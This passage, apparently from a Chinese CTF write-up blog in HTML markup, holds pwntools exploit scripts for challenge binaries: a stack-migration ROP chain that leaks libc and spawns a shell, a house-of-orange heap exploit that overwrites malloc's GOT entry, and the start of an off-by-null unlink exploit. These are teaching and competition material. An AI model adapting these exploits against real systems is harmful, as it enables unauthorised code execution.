operator">=</span><span class="token number">0x601000</span><span class="token operator">+</span><span class="token number">0x200</span>bss1<span class="token operator">=</span><span class="token number">0x601000</span><span class="token operator">+</span><span class="token number">0x400</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_leave_ret<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Do you still have something to say?'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_leave_ret<span class="token punctuation">)</span>s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment">#----------------leak libc</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000400963</span>payload<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>eg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ep<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>bss1<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_leave_ret<span class="token punctuation">)</span>s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>puts<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>libc<span class="token operator">=</span>puts<span class="token operator">-</span><span class="token number">0x000000000006F6A0</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">)</span><span class="token comment">#---------------</span>system<span class="token operator">=</span><span class="token number">0x00000000000453A0</span><span class="token operator">+</span>libcbinsh<span class="token operator">=</span><span class="token number">0x000000000018ce57</span><span class="token operator">+</span>libcpayload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss1<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_leave_ret<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x0000000000400897'</span><span class="token punctuation">)</span>s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>rop<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>binsh<span class="token punctuation">,</span>system<span class="token punctuation">]</span><span class="token punctuation">)</span>s<span class="token punctuation">(</span>rop<span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./stackmigration'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="orange"><a href="#orange" class="headerlink" title="orange"></a>orange</h1><p>glibc2.23</p><p>能申请任意大小的chunk和堆溢出，但是没有free</p><p>利用 house of orange 获得空闲块，看题目有后门，还没开full relro，我选择打malloc的GOT表</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Please enter your choice>>'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input your note size'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input your note'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input note index'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input your note size'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input your note'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input index'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>door<span class="token operator">=</span><span class="token number">0x0000000000400987</span><span class="token comment">#---------orange</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfe1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xf40</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>    <span class="token comment">#ub->0xfe1</span>    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf48</span><span class="token operator">+</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x71</span><span class="token punctuation">,</span><span class="token number">0x60209d</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>eg<span class="token punctuation">(</span><span class="token string">'malloc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>door<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#---------attack</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input your note size'</span><span class="token punctuation">,</span><span class="token string">'20'</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./Orange'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><p>glibc2.23</p><p><img src="/EXP_FILE/d9abf66b5138d0173b97be4dd8b7c323_MD5.jpeg"></p><p>libc2.23的off by null，打unlink构造重叠堆块，然后打__malloc_hook</p><p>环境条件不满足one_gadget的条件，需要利用__realloc_hook来调节栈帧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Choose an option >> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'How much do you want'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Enter something?'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input index'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Enter something?'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Give me a index.Let you see see'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input index'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0x108</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span> <span class="token comment">#0</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>  <span class="token comment">#1</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>  <span class="token comment">#2</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>  <span class="token comment">#3  </span>add<span class="token punctuation">(</span><span class="token number">0x3f0</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span> <span class="token comment">#4</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>  <span class="token comment">#5</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x210</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token 